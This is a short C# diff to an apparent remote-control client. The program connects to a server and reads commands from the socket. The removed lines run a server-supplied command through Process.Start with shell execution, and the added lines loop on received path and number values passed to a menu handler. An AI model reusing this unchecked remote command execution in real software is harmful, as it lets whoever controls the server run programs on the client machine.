@@ -12,20 +12,23 @@ namespace ClientProject
         {
             Client client = new Client();
             string path;
+            string num;
+            StringBuilder str;
             try
             {
                 client.Connect();
-                //Console.WriteLine(client.GetMsg().ToString());
-                path = client.GetMsg().ToString();
-                Console.WriteLine(path);
-                Process.Start(new ProcessStartInfo(client.command.ToString()) { UseShellExecute = true });
-                Console.WriteLine(path);
+                
+                
 
                 while (true)
                 {
+                    path = client.GetMsg().ToString();
+                    num = client.GetMsg().ToString();
+                    
+                    client.Menu(path, num,client.socket);
 
                     //Console.WriteLine(client.GetMsg().ToString());
-                    
+
                 }
             }
             catch (Exception ex)
